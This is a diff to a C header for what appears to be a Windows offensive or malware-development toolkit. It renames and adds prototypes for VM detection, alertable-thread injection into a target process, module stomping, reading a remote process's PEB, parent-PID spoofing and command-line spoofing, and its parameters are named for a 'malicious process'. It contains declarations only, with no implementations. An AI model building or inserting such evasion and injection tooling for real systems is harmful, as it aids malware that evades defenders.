@@ -95,9 +95,10 @@ INT8 CheckVM
 	IN     void
 );
 
-BOOLEAN FetchLocalAlertableThread
+BOOLEAN FetchAlertableThread
 (
 	IN     DWORD   dwMainThreadId,
+	IN     DWORD   dwTargetPID,
 	   OUT PDWORD  pdwAlertedThreadId,
 	   OUT PHANDLE phAlertedThreadHandle
 );
@@ -191,16 +192,20 @@ BOOL FetchStompingTarget
 	IN     LPSTR  pSacrificialFuncName,
 	   OUT PVOID *pTargetFunctionAddress
 );
-
+UCHAR FetchImageHeaders
+(
+	IN     HANDLE hTargetProcess,
+	   OUT PPEB  *pPEB
+);
 
 BOOLEAN SpoofParentProcessId
 (
 	IN     LPSTR   pMaliciousProcessName, 
-	IN     HANDLE  hDesiredParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
+	IN     HANDLE  hSpoofedParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
 	   OUT PDWORD  pdwMaliciousProcessPID,
 	   OUT PHANDLE phMaliciousProcessHandle,
-	   OUT PHANDLE phMaliciousThreadHandle,
-	   OUT PDWORD  pdwMaliciousThreadId
+	   OUT PDWORD  pdwMaliciousThreadId,
+	   OUT PHANDLE phMaliciousThreadHandle
 );
 
 BOOLEAN SpoofCommandLineArguments
